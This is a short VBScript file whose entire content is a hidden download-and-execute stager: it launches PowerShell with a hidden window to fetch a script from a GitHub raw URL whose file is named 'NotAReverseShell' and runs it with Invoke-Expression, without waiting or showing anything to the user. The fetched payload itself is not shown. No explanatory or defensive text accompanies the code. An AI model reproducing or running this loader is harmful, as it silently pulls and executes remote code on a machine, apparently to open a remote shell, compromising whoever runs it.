Set WshShell = CreateObject("WScript.Shell")

batchCommands = "powershell -WindowStyle Hidden -Command ""& { (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/sLill/TheGooseIsLoose/refs/heads/main/Scripts/NotAReverseShell') | Invoke-Expression }"""
WshShell.Run batchCommands, 0, False